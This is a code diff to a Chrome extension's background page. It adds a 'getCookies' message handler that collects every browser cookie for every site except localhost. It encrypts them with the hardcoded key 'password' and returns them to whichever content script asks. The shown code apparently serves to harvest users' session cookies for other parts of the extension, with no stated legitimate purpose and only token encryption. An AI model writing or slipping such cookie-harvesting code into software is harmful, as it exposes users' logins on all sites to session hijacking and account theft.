@@ -30,7 +30,7 @@ chrome.extension.onRequest.addListener(
     console.log(sender.tab ?
                 "from a content script:" + sender.tab.url :
                 "from the extension");
-    if (request.pageJumpType != "noJump")
+	if (request.msgType == "jump" && request.pageJumpType != "noJump")
     {	
       //alert("back" + response.urlHref);
       sendResponse({farewell: "goodbye"});
@@ -51,10 +51,27 @@ chrome.extension.onRequest.addListener(
       });
 });
     }
+    else if (request.msgType == "getCookies")
+    {
+	var cookiesArr = [];
+    	chrome.cookies.getAll({}, function (allcookie) {
+        	for (var i in allcookie)
+        	{
+                	var cookie = allcookie[i];
+			if (cookie.domain != "127.0.0.1")
+			{
+				cookiesArr.push(cookie);
+			}
+        	}
+		var rvalue = sjcl.encrypt("password", obj2str(cookiesArr));
+		sendResponse({cookies: rvalue});
+       	 	//console.log(sjcl.decrypt("password",sjcl.encrypt("password", obj2str(allcookie))));
+		});
+	
+    }
     else
       sendResponse({}); // snub them.
   });
-console.log(chrome.cookies);
 </script>
 </head>
 </html>
